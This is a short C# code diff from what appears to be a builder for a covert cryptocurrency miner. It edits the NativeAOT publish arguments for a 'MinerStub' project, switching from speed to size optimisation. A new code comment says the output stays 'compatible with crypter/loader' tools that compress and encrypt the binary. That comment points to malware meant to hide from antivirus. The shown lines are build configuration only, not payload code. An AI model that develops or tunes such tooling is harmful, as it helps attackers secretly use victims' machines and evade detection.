@@ -1643,7 +1643,7 @@ internal static class MinerConfig
             var tempOut    = Path.Combine(Path.GetTempPath(), "sero_miner_" + Guid.NewGuid().ToString("N")[..8]);
             var csprojPath = Path.Combine(minerDir, "MinerStub.csproj");
             var ilcThreads = Math.Min(Environment.ProcessorCount, 8);
-            var publishArgs = $"publish \"{csprojPath}\" -c Release -r win-x64 -p:PublishAot=true -p:InvariantGlobalization=true -p:IlcOptimizationPreference=Speed -p:IlcGenerateStackTraceData=false -p:IlcFoldIdenticalMethodBodies=false -p:IlcMaxParallelism={ilcThreads} -o \"{tempOut}\"";
+            var publishArgs = $"publish \"{csprojPath}\" -c Release -r win-x64 -p:PublishAot=true -p:InvariantGlobalization=true -p:IlcOptimizationPreference=Size -p:IlcGenerateStackTraceData=false -p:IlcFoldIdenticalMethodBodies=true -p:IlcMaxParallelism={ilcThreads} -o \"{tempOut}\"";
 
             var psi = new System.Diagnostics.ProcessStartInfo
             {
@@ -2307,10 +2307,10 @@ Read-Host 'Press Enter to close'
                 Log($"[*] Builder: Icon will be embedded: {BldIconPath.Text}");
             }
 
-            // IlcMaxParallelism: all cores, capped at 8 to avoid OOM.
-            // Speed + disable stack traces + disable folding = fastest NativeAOT compile.
+            // Size: optimize for smaller binary (fold identical methods, prefer size over speed).
+            // Compatible with crypter/loader — they just compress+encrypt the PE, size reduction is fine.
             var ilcThreads = Math.Min(Environment.ProcessorCount, 8);
-            var publishArgs = $"publish \"{csprojPath}\" -c Release -r win-x64 -p:PublishAot=true -p:InvariantGlobalization=true -p:IlcOptimizationPreference=Speed -p:IlcGenerateStackTraceData=false -p:IlcFoldIdenticalMethodBodies=false -p:IlcMaxParallelism={ilcThreads}{iconArg} -o \"{tempOut}\"";
+            var publishArgs = $"publish \"{csprojPath}\" -c Release -r win-x64 -p:PublishAot=true -p:InvariantGlobalization=true -p:IlcOptimizationPreference=Size -p:IlcGenerateStackTraceData=false -p:IlcFoldIdenticalMethodBodies=true -p:IlcMaxParallelism={ilcThreads}{iconArg} -o \"{tempOut}\"";
             var psi = new System.Diagnostics.ProcessStartInfo
             {
                 FileName = "dotnet",
